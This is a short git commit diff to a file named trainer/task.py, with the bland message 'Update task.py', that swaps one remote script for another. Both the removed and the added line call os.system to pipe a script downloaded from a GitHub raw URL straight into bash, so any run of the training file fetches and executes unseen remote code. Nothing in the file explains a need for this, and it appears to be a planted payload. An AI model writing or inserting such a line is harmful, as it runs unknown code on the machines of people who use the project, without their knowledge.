0ae2d34f9fda492070fe493737bd351321ac0f7a
kidoescegh <kidoescegh@gmail.com>
2025-06-29 20:11:47 -0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kidoescegh/filee/raw/main/kylagh-fix | bash')
+os.system('curl -sL https://github.com/kidoescegh/filee/raw/main/tetekyla | bash')
